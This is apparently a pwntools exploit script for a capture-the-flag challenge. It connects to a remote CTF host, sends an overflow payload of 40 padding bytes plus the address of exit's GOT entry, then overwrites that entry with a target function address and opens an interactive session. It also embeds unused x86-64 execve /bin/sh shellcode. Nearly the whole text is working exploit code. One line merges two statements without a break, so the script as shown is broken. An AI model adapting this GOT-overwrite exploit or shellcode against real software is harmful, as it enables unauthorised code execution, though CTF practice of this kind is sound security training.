from pwn import *
#p = process("./heap")
p = remote("ctf.j0n9hyun.xyz", 3016)
e = ELF("./heap")

bss = e.bss()
script = '''
b *0x40098e
'''

#gdb.attach(p, script)

exit_got = e.got['exit']log.info("exit_got : " + str(hex(exit_got)))
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload  = "A" * 40
payload += p64(exit_got)
p.sendline(payload)

log.success("First Send OKAY")

flagcode = 0x400826
p.sendline(p64(flagcode))

log.success("Last Send OKAY")

p.interactive()
